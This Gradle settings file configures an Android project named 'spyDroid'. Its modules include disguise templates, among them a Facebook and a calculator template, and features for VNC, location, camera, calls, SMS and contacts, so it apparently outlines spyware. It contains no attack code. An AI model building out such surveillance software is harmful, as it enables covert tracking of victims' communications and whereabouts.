/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

//templates app
include(":app")
include(":template-default")
include(":template-facebook")
include(":template-calculator")
include(":template-sample")

//system
include(":core-database")
include(":core-data")
include(":core-ui")
include(":feature-vnc")
include(":feature-location")
include(":feature-camera")
include(":feature-multimedia")
include(":feature-calls")
include(":feature-sms")
include(":feature-sharedata")
include(":feature-contacts")

//project
rootProject.name = "spyDroid"

include(":core-mf")
include(":sample-template")
include(":sample-template:core-data")
include(":sample-template:app")
